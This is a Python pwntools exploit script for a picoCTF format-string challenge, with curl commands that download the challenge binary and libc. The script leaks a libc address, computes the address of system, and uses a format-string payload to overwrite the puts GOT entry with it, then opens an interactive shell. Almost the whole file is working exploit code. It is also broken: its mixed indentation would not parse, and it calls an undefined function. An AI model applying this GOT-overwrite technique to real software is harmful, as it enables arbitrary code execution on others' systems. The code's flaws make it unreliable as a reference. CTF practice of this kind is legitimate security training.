"""
Binary: curl -sO https://artifacts.picoctf.net/c_rhea/2/format-string-3
Source: curl -sO https://artifacts.picoctf.net/c_rhea/2/format-string-3.c
Libc: curl -sO https://artifacts.picoctf.net/c_rhea/2/libc.so.6
ld: curl -sO https://artifacts.picoctf.net/c_rhea/2/ld-linux-x86-64.so.2

GDB commands to run with given libc:

useful link: http://truthbk.github.io/gdb-ld_preload-and-libc/
$ set exec-wrapper env 'LD_PRELOAD=/path/to/sobject/yourobject.so'

"""

#!/usr/bin/env python3

from pwn import *

def run_exploit():

	'''
	GOT address to overwrite: 0x404018

	execve offset from setvbuf: 0x60600
	buffer argument location: %38$lx

	'''

	# command = "./ld-linux-x86-64.so.2 --library-path ./libc.so.6 ./format-string-3"
	context.binary = binary = ELF("./format-string-3",checksec=False)
	# context.log_level = 'debug'
	libc = ELF("./libc.so.6", checksec=False)
	ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

	# execve_offset = 0x60600 # to add to setvbuf
	# system_offset = 0x2ac90 # to subtract from setvbuf
	execve_offset = 0x60600 # to add to setvbuf
	system_offset = 0x2ac90 # to subtract from setvbuf


    localrun = True
    if localrun:
        # run the local binary
        io = process([ld.path, binary.path], env={"LD_PRELOAD": libc.path})
    else:
        HOST = "rhea.picoctf.net"
        POST = 56780
        # io = remote(HOST,POST)

	banner = io.recvuntil(b"libc: ")
	print(banner)
	setvbuf = io.recv().strip()
	setvbuf_addr = int(setvbuf, 16)
	libc_base = setvbuf_addr - binary.libc.symbols.setvbuf
	execve_adder = libc_base + binary.libc.symbols.execve
	system_addr = libc_base + binary.libc.symbols.system
	

	payload = fmtstr_payload(38, {binary.got.puts: system_addr }, write_size='short')
	print(f"Payload: {payload}")

	# exit()
	# io.recv()
	io.sendline(payload)
	# io.recv(system_addr)

	# io.sendline(b"ls -la")
	# io.recvall()

	# print(io.recv())
	io.interactive()
	# print(io.recvall())


	# setvbuf = b'0x' + setvbuf[2:].rjust(16, b'0')
	# print(setvbuf)
	# print(str(setvbuf))
	# print(binary.plt.setvbuf, p64(binary.plt.setvbuf))

	# setvbuf_address = int(setvbuf, 16)
	# print(setvbuf_address, p64(setvbuf_address))



if __name__ == "__main__":
	run_exploit()
	exit()
	import sys
	setvbuf_addr = sys.argv[1]
	payload = generate_payload(setvbuf_addr)
	print(payload)
